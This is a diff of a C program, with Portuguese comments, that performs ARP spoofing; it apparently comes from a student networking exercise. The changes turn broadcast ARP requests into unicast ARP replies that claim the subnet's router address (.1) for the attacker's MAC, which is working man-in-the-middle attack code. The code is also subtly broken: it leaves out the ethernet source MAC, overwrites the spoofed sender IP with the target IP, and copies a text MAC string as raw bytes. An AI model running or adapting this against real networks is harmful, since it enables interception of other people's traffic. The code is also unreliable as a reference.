@@ -15,7 +15,7 @@
 #define BUFFER_SIZE 1600
 #define MAX_DATA_SIZE 1500
 #define ARP_HDRLEN 28
-#define IF_DEBUG 0
+#define IF_DEBUG 1
 
 #define INT_TO_ADDR(_addr) \
 (_addr & 0xFF), \
@@ -38,6 +38,7 @@ struct _arp_hdr {
 
 char ifname[IFNAMSIZ];
 char target_ip[15];
+char target_mac[17];
 
 
 int potencia(int base, int expoente){
@@ -182,6 +183,39 @@ int setArpTable(char *ip, char *mac){
 	return 0;
 }
 
+void getmactarget(char *ip){
+
+	FILE *pFile;
+	pFile = fopen("arp_table.txt", "r");
+	char line[256];    
+	char line_ip[15];
+	char line_mac[17];
+	
+	if (pFile) {
+
+		while (fgets(line, sizeof(line), pFile)) {
+
+			char * str;
+			str = strtok (line,"\t");
+			strcpy(line_ip, str);
+			str = strtok (NULL, "\t");
+			strcpy(line_mac, str);
+
+			if(strcmp(line_ip, ip) == 0){     
+				strcpy(target_mac,line_mac);				
+				break;
+			}		
+		}
+
+		fclose(pFile);
+	}
+
+	if(IF_DEBUG){
+		printf("MAC ALVO %s", target_mac);	
+	}
+	
+}
+
 void * redirect(void *args)
 {
 	//clear arp table
@@ -242,8 +276,12 @@ void * poisoning(void *args){
 	struct sockaddr_ll socket_address;
 	int frame_len = 0;
 	char buffer[BUFFER_SIZE];
-	char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
+	//MEXI AQUI char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
 	short int ethertype = htons(0x0806);
+
+
+	//MEXI AQUI busca o mac do alvo no arquivo txt
+	getmactarget(target_ip);
 
 	arp_hdr arphdr;
 
@@ -277,7 +315,8 @@ void * poisoning(void *args){
 	socket_address.sll_halen = ETH_ALEN;
 
 	/* Endereco MAC de destino */
-	memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);
+	//MEXI AQUI memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);
+	memcpy(socket_address.sll_addr, target_mac, MAC_ADDR_LEN);
 
 	/* Preenche o buffer com 0s */
 	memset(buffer, 0, BUFFER_SIZE);
@@ -285,11 +324,15 @@ void * poisoning(void *args){
 	/* Monta o cabecalho Ethernet */
 
 	/* Preenche o campo de endereco MAC de destino */	
-	memcpy(buffer, dest_mac, MAC_ADDR_LEN);
+	// MEXI AQUI memcpy(buffer, dest_mac, MAC_ADDR_LEN);
+	memcpy(buffer, target_mac, MAC_ADDR_LEN);
+	
 	frame_len += MAC_ADDR_LEN;
 
 	/* Preenche o campo de endereco MAC de origem */
-	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
+	//memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
+	
+
 	frame_len += MAC_ADDR_LEN;
 
 	/* Preenche o campo EtherType */
@@ -311,26 +354,41 @@ void * poisoning(void *args){
 	arphdr.plen = 4;
 
 	/* OpCode: 1 for ARP request */
-	arphdr.opcode = htons (1);
-
-	/* Sender hardware address (48 bits): MAC address */
-	
-	// if(if_mac.ifr_hwaddr.sa_data[3] > 0xffffff00){
-	// 	printf("tretta mac: %.02x\n", if_mac.ifr_hwaddr.sa_data[3] % 0xffffff00);
-	// 	if_mac.ifr_hwaddr.sa_data[3] = if_mac.ifr_hwaddr.sa_data[3] % 0xffffff00;
-	// }
-	// printf("now mac: %.02x\n", if_mac.ifr_hwaddr.sa_data[3]);
+	//MEXI AQUI -> EXECUTA UM REPLAY NO DESTINO
+	//arphdr.opcode = htons (1);
+	arphdr.opcode = htons (2);
 
 	memcpy (&arphdr.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
+
 	/* Target hardware address (48 bits): zero, since we don't know it yet. */
 	memset (&arphdr.target_mac, 0, 6 * sizeof (uint8_t));
 	
 	// help vars for multiple sends
 	char sender_ip[15];
+	unsigned char target_byte[4];
+	int s_ip = 0;
+	
+	// get sender ip
+	s_ip = getip(ifname, sender_ip);
 
+
+	//Meu Ip fateado
+    target_byte[0] = s_ip & 0xFF;
+    target_byte[1] = (s_ip >> 8) & 0xFF;
+    target_byte[2] = (s_ip >> 16) & 0xFF;
+
+    //SIMULA SER O ROTEADOR
+	target_byte[3] = 1;
+
+	// set host number
+	memset(sender_ip, 0, sizeof(sender_ip));
+	sprintf(sender_ip, "%d.%d.%d.%d", target_byte[0],target_byte[1],target_byte[2],target_byte[3]);
+
+	//
 	inet_pton (AF_INET, sender_ip, &arphdr.sender_ip);
-
+	//
 	inet_pton (AF_INET, target_ip, &arphdr.sender_ip);
+	//IP ALVO
 	inet_pton (AF_INET, target_ip, &arphdr.target_ip);
 
 	memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
